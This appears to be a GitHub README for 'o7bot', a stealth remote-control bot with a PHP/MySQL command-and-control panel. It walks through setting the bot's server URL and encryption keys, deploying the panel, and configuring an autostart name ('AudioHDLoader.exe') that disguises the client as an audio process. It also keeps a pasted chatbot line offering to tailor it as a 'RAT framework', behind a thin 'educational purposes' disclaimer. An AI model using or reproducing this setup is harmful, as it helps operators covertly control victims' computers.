o7bot is a lightweight and extensible automation tool designed for seamless task execution, system interaction, and remote control. Built with performance and stealth in mind, o7bot provides a modular framework for executing commands, monitoring system activity, and managing distributed clients securely and efficiently.

🔧 Features
✅ Lightweight architecture with minimal footprint

🧩 Modular command execution framework

🌐 Remote command & control capability

📝 Persistent system logging and reporting

🔍 Real-time task tracking and client management

📡 Supports HTTP(S) communication with custom endpoints

🛠 Easily customizable for specific use cases

📦 Installation
Clone the repository:
git clone https://github.com/yourname/o7bot.git
cd o7bot
Build and run using your preferred .NET compiler or Visual Studio.

⚙️ Configuration
change the weburl too what your address is private static string BotServer = "http:///Webpanel/connect.php";
📁 Step 1: Edit config.inc.php
Open the file config.inc.php in a text editor.

Enter your MySQL database credentials:
Generate AES-128 keys and put them into 
 private static readonly byte[] Key = Encoding.UTF8.GetBytes(""); // 16 bytes (AES-128)

$host = 'localhost';       // Database host
$user = 'your_db_user';    // Database username
$pass = 'your_db_pass';    // Database password
$dbname = 'your_db_name';  // Database name
Save the file.

📤 Step 2: Upload the Files
Upload all panel files (including config.inc.php) to your web server.

Make sure your server supports PHP and has MySQL access.

🗃 Step 3: Import MySQL Tables
Open phpMyAdmin (or use MySQL CLI).

Select your target database.
Import the file n0ise.sql:
In phpMyAdmin: Go to "Import" → Choose n0ise.sql → Click Go.
mysql -u your_db_user -p your_db_name < n0ise.sql
🎉 Step 4: Done!
You can now access the panel via your browser:
http://yourdomain.com/index.php
if youd like to edit things below you can too
{
  "BotServer": "http://yourpanel.com/connect.php",
  "AutostartName": "AudioHDLoader.exe",
  "Interval": 10
}
⚠️ Disclaimer
This project is intended for educational and research purposes only. Unauthorized deployment, misuse, or use in violation of applicable laws is strictly prohibited.
Let me know if you want it tailored for a specific purpose (e.g., Discord bot, system tool, RAT framework, etc.).
report anybugs to o7lab@dmnx.su

